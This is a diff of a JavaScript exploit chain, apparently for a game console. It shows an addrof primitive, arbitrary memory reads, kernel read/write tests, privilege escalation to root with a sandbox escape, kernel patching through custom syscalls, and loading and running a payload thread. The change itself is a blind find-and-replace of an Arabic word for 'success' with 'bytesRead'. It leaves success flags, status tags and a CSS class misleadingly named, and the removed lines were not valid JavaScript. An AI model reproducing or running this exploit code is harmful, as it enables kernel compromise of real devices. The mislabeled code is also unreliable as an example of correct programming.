@@ -587,7 +587,7 @@ function __getPatchU8(name) {
     getterCarrier[1] = targetHolder;
     getterCarrier[2] = fakeHost;
     getterCarrier[3] = targetHolder;
-    emit("ADDROF-CARRIER-تم بنجاح", "host-holder-host-holder");
+    emit("ADDROF-CARRIER-bytesRead", "host-holder-host-holder");
     preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
     emit("ADDROF-WRAPPER-READY", `wait=${CAPTURE_DELAY_MS}ms`);
     setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
@@ -1406,17 +1406,17 @@ function __getPatchU8(name) {
   }
   function readInto(dest, addr, count) {
     const base = addrNumber(addr);
-    let تم بنجاح = 0;
-    while (تم بنجاح < count) {
-      const chunk = Math.min(count - تم بنجاح, carrier.windowBytes);
-      aimFor(base + تم بنجاح, chunk);
+    let bytesRead = 0;
+    while (bytesRead < count) {
+      const chunk = Math.min(count - bytesRead, carrier.windowBytes);
+      aimFor(base + bytesRead, chunk);
       try {
         for (let i = 0; i < chunk; ++i)
-          dest[تم بنجاح + i] = carrier.view[i];
+          dest[bytesRead + i] = carrier.view[i];
       } finally {
         carrier.restore();
       }
-      تم بنجاح += chunk;
+      bytesRead += chunk;
     }
     return dest;
   }
@@ -2434,7 +2434,7 @@ function __getPatchU8(name) {
     if (ok) hostOk();
     else hostFail();
     if (SHOW_LOG || !document.body) return;
-    document.body.className = ok ? "تم بنجاح" : "fail";
+    document.body.className = ok ? "bytesRead" : "fail";
   }
   function mark(tag, detail) {
     const raw = detail;
@@ -2526,7 +2526,7 @@ function __getPatchU8(name) {
   var mainArmed = false;
   var pinRestore = null;
   var jbRestoreHook = null;
-  var allتم بنجاح = false;
+  var allbytesRead = false;
   var jailbroken = false;
   var kpatched = false;
   var payloadRunning = false;
@@ -2750,7 +2750,7 @@ function __getPatchU8(name) {
         }
         trace("CH-CANCEL", label + " nodes=" + nNodes + " walking");
         sc(SYS.aio_multi_cancel, idAd2, 1, stAd2);
-        trace("CH-CANCEL-تم بنجاح", label + " returned");
+        trace("CH-CANCEL-bytesRead", label + " returned");
         const moved = 1073741824 - snkDv.getInt32(0, true);
         const n0 = 1073741824 - snkDv.getInt32(32, true);
         const w = whoHasF();
@@ -3179,7 +3179,7 @@ function __getPatchU8(name) {
         if (uid0 === 0 || su0 === 0) {
           alreadyLoaded = true;
           payloadRunning = true;
-          allتم بنجاح = true;
+          allbytesRead = true;
           mark("ALREADY-ROOT", "getuid=" + uid0 + " setuid(0)=" + su0);
           hostAlready();
           return;
@@ -3985,7 +3985,7 @@ function __getPatchU8(name) {
         "fw=" + fwKey + " kernel_base=" + KBASE + " armings=" + armCount + " curthread=" + CT1 + " verdict=" + (kbAligned ? "ANCHORED" : "REJECTED") + (kbAligned ? " next=kfile" : " reason=not_0x4000_aligned")
       );
       if (!kbAligned) {
-        allتم بنجاح = true;
+        allbytesRead = true;
         return;
       }
       const OID = KBASE.add32(off.k_oid_kern_file);
@@ -4127,7 +4127,7 @@ function __getPatchU8(name) {
         capsWrote = capsPend;
       }
       mark(
-        "CAPS-تم بنجاح",
+        "CAPS-bytesRead",
         "wrote=" + capsWrote + " skip=" + (capsSkip || "none") + " armings=" + armCount
       );
       const after = kernFile(false, "after-unhide");
@@ -4155,7 +4155,7 @@ function __getPatchU8(name) {
         planOk,
         planOk ? "" : "capsLive=" + (capsLive ? 1 : 0) + " posA=" + (posA ? posA.length : "null") + " posA2=" + (posA2 ? posA2.length : "null")
       )) {
-        allتم بنجاح = true;
+        allbytesRead = true;
       } else {
         {
           let i = 0;
@@ -4172,9 +4172,9 @@ function __getPatchU8(name) {
             "nodes=" + i + " (3 unhide + " + posA.length + " A + " + posA2.length + " A2)"
           );
           if (!check("krw-fire-bounded", i > 0 && i <= MAXN, "nodes=" + i)) {
-            allتم بنجاح = true;
+            allbytesRead = true;
           } else if (runChain(i, "krw-setup") === null) {
-            allتم بنجاح = true;
+            allbytesRead = true;
           } else {
             let kMib = function(a, b) {
               kmDv.setInt32(0, a, true);
@@ -4290,7 +4290,7 @@ function __getPatchU8(name) {
               krwOk,
               "krwOk=" + (krwOk ? 1 : 0) + " (endgame needs all 5 KRW self-tests to pass)"
             )) {
-              allتم بنجاح = true;
+              allbytesRead = true;
             } else {
               let kview = function(base) {
                 return {
@@ -4315,7 +4315,7 @@ function __getPatchU8(name) {
               const kptr = (v) => !!v && v.hi >>> 0 >= 4294901760;
               const NEG1 = new int64(4294967295, 4294967295);
               const stSetuid = findStub(23), stGeteuid = findStub(25), stOpen = findStub(5);
-              let jbتم بنجاح = false, kpتم بنجاح = false, plتم بنجاح = false, jbUcred = null;
+              let jbbytesRead = false, kpbytesRead = false, plbytesRead = false, jbUcred = null;
               let jbSaved = null, jbRestored = false;
               let kpatchBlob = null, payloadBlob = null;
               const SITES = [];
@@ -4495,20 +4495,20 @@ function __getPatchU8(name) {
                           escaped = true;
                       }
                     }
-                  jbتم بنجاح = uidNow2 === 0 && rbUid === 0 && sameI64(rbPrison, prison0) && sameI64(rbRdir, rootvn);
-                  jailbroken = jbتم بنجاح;
+                  jbbytesRead = uidNow2 === 0 && rbUid === 0 && sameI64(rbPrison, prison0) && sameI64(rbRdir, rootvn);
+                  jailbroken = jbbytesRead;
                   mark(
                     "JB-ROOT",
                     "getuid=" + uidNow2 + " geteuid=" + euNow + " setuid0=" + suNow + " cr_uid=" + rbUid + " cr_prison=" + rbPrison + " fd_rdir=" + rbRdir + " sandbox_after=[" + after2.join(" ") + "] escaped=" + (escaped ? 1 : 0)
                   );
                   check(
                     "JB-ROOT-AND-ESCAPE",
-                    jbتم بنجاح,
+                    jbbytesRead,
                     "getuid=" + uidNow2 + " cr_uid=" + rbUid
                   );
                 }
               }
-              if (jbتم بنجاح && DO_PATCH) {
+              if (jbbytesRead && DO_PATCH) {
                 const jitStub = findStub(533), kexecStub = findStub(661);
                 mark(
                   "KPATCH-PRE",
@@ -4604,15 +4604,15 @@ function __getPatchU8(name) {
                           if ((read82(KBASE.add32(st)).low & 255) !== 235)
                             allEb = false;
                         const restored = sameI64(SV.getBInt(8), oCall) && SV.getInt32(0) === oNarg && SV.getInt32(44) === oThr;
-                        kpتم بنجاح = rc === 0 && allEb && restored;
-                        kpatched = kpتم بنجاح;
+                        kpbytesRead = rc === 0 && allEb && restored;
+                        kpatched = kpbytesRead;
                         mark(
                           "KEXEC",
                           "syscall(661)=" + rc + " sites_eb=" + (allEb ? 1 : 0) + " sysent_restored=" + (restored ? 1 : 0)
                         );
                         check(
                           "KERNEL-PATCHED",
-                          kpتم بنجاح,
+                          kpbytesRead,
                           "rc=" + rc + " allEb=" + (allEb ? 1 : 0) + " restored=" + (restored ? 1 : 0)
                         );
                       }
@@ -4665,7 +4665,7 @@ function __getPatchU8(name) {
                   "PAYLOAD-SKIPPED",
                   "cleanup incomplete (tdOk=" + (tdOk ? 1 : 0) + " restoreOk=" + (restoreOk ? 1 : 0) + ") -- reboot required"
                 );
-              } else if (kpتم بنجاح && DO_PAYLOAD && payloadBlob && payloadBlob[0] === 233) {
+              } else if (kpbytesRead && DO_PAYLOAD && payloadBlob && payloadBlob[0] === 233) {
                 const sz = payloadBlob.length + 16383 & ~16383;
                 const m2 = sc(SYS.mmap, 0, sz, 7, 4098, -1, 0);
                 const entry = new int64(m2.lo, m2.hi);
@@ -4710,26 +4710,26 @@ function __getPatchU8(name) {
                       tdv.getUint32(0, true),
                       tdv.getUint32(4, true)
                     );
-                    plتم بنجاح = rc === 0 && handle.hi >>> 0 > 0;
+                    plbytesRead = rc === 0 && handle.hi >>> 0 > 0;
                     mark(
                       "PAYLOAD-RUN",
                       "pthread_create=" + rc + " handle=" + handle
                     );
                     check(
                       "PAYLOAD-RUNNING",
-                      plتم بنجاح,
+                      plbytesRead,
                       "rc=" + rc + " handle=" + handle
                     );
                   }
                 }
               }
-              const stable = !!plتم بنجاح && cleanEnough;
+              const stable = !!plbytesRead && cleanEnough;
               payloadRunning = stable;
               mark(
                 "EG-VERDICT",
-                "fw=" + fwKey + " kernel_base=" + KBASE + " jailbroken=" + (jbتم بنجاح ? 1 : 0) + " kpatched=" + (kpتم بنجاح ? 1 : 0) + " payload_thread=" + (plتم بنجاح ? 1 : 0) + " stable=" + (stable ? 1 : 0) + " tdOk=" + (tdOk ? 1 : 0) + " restoreOk=" + (restoreOk ? 1 : 0) + " jb_restored=" + (jbRestored ? 1 : 0) + " armings=" + armCount
+                "fw=" + fwKey + " kernel_base=" + KBASE + " jailbroken=" + (jbbytesRead ? 1 : 0) + " kpatched=" + (kpbytesRead ? 1 : 0) + " payload_thread=" + (plbytesRead ? 1 : 0) + " stable=" + (stable ? 1 : 0) + " tdOk=" + (tdOk ? 1 : 0) + " restoreOk=" + (restoreOk ? 1 : 0) + " jb_restored=" + (jbRestored ? 1 : 0) + " armings=" + armCount
               );
-              allتم بنجاح = stable;
+              allbytesRead = stable;
             }
           }
         }
@@ -4845,7 +4845,7 @@ function __getPatchU8(name) {
       }
       mark(
         "PROOF-SUMMARY-FINAL",
-        "pass=" + passCount + " fail=" + failCount + (allتم بنجاح ? "" : "  INCOMPLETE")
+        "pass=" + passCount + " fail=" + failCount + (allbytesRead ? "" : "  INCOMPLETE")
       );
       try {
         if (!alreadyLoaded) finishUI(payloadRunning);
